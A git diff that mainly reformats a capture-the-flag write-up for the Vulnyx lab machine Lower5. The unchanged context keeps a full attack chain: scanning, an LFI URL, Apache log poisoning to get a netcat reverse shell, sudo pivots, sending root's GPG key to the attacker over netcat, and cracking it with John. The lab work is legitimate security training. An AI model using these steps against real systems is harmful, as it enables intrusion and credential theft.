@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Lower5
+---
+icon: linux
+---
 
-**Platform:** Vulnyx  
-**Operating System:** Linux  
+# Lower5 ​​
 
-> **Tags:** `Linux` `LFI` `Log Poisoning` `User-Agent` `Apache Logs` `Sudoers` `GPG` `John the Ripper` 
+## 🖥️ Writeup - Lower5
 
-# INSTALLATION
+**Platform:** Vulnyx\
+**Operating System:** Linux
+
+> **Tags:** `Linux` `LFI` `Log Poisoning` `User-Agent` `Apache Logs` `Sudoers` `GPG` `John the Ripper`
+
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Lower5 machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Lower5 machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Lower5, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,22 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:14:65:c8      1      60  PCS Systemtechnik GmbH      
  10.0.4.31       08:00:27:33:a7:76      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 We identify with high confidence that the victim’s IP is `10.0.4.31`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.31
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.31
 ```
+
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 16:11 CET
 Nmap scan report for 10.0.4.31
@@ -70,15 +80,15 @@ We identify ports `22` and `80` as open.
 
 We access the web service on port `80` and encounter the following page:
 
-![alt text](../../images/vteam.png)
+![alt text](../../.gitbook/assets/vteam.png)
 
 If we navigate to `About Us`, we see that the `URL` reveals a possible vulnerability:
 
-![alt text](../../images/page.php.png)
+![alt text](../../.gitbook/assets/page.php.png)
 
 We notice that through the `page.php` file, the `About Us` page is included for us to view. This could very well be vulnerable to `LFI`.
 
-# LFI
+## LFI
 
 We verify this by attempting to view the `/etc/passwd` file, and indeed, it is vulnerable.
 
@@ -87,6 +97,7 @@ http://10.0.4.31/page.php?inc=/etc/passwd
 ```
 
 Info:
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -118,7 +129,7 @@ We cannot do much with this information yet, so we continue looking for interest
 
 We discover that we can also view the `/var/log/apache2/access.log` file. This means it is highly probable that the exploitation vector for this machine is `Log Poisoning`.
 
-# LOG POISONING
+## LOG POISONING
 
 We use `curl` to send a web request with malicious `PHP` code through the `User-Agent` header.
 
@@ -135,6 +146,7 @@ nc -nlvp 4444
 Next, we refresh the page `http://10.0.4.31/page.php?inc=/var/log/apache2/access.log`.
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [10.0.4.12] from (UNKNOWN) [10.0.4.31] 53442
@@ -144,28 +156,33 @@ www-data
 
 We receive the shell on our `listener` as the `www-data` user.
 
-# TTY
+## TTY
 
 Before attempting privilege escalation, we upgrade the `TTY` for a more interactive shell:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 
 We check for `sudo` and `SUID` permissions.
 
@@ -174,6 +191,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for www-data on lower5:
     env_reset, mail_badpass,
@@ -191,6 +209,7 @@ sudo -u low /usr/bin/bash -i
 ```
 
 Info:
+
 ```
 low@lower5:/var/www/html$ whoami
 low
@@ -204,6 +223,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for low on lower5:
     env_reset, mail_badpass,
@@ -214,14 +234,14 @@ User low may run the following commands on lower5:
     (root) NOPASSWD: /usr/bin/pass
 ```
 
-We can execute the `pass` binary with `root` privileges.
-We run it to see what it does.
+We can execute the `pass` binary with `root` privileges. We run it to see what it does.
 
 ```bash
 sudo -u root /usr/bin/pass
 ```
 
 Info:
+
 ```
 Password Store
 `-- root
@@ -251,6 +271,7 @@ nc -nlvp 4443 > root.gpg
 Next, we run the command on the victim machine.
 
 Info:
+
 ```
 listening on [any] 4443 ...
 connect to [10.0.4.12] from (UNKNOWN) [10.0.4.31] 52858
@@ -265,6 +286,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
 Info:
+
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
@@ -292,6 +314,7 @@ su root
 ```
 
 Info:
+
 ```
 root@lower5:/home/low# whoami
 root
